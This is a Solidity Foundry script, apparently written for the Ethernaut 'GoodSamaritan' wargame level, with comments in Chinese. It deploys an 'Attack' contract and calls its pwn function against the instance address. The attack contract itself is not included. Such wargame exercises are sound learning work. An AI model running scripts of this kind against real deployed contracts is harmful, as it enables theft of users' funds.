// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/GoodSamaritan.sol";

contract ExploitScript is Script {
    function run() external {
        // 從環境變數讀取私鑰
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        
        // 你的 Ethernaut 實例地址
        address target = vm.envAddress("INSTANCE_ADDRESS");

        vm.startBroadcast(deployerPrivateKey);

        // 1. 部署攻擊合約
        Attack attacker = new Attack();
        console.log("Attack contract deployed at:", address(attacker));

        // 2. 執行攻擊
        console.log("Triggering exploit...");
        attacker.pwn(target);

        console.log("Exploit finished! Check your instance balance on Ethernaut.");

        vm.stopBroadcast();
    }
}
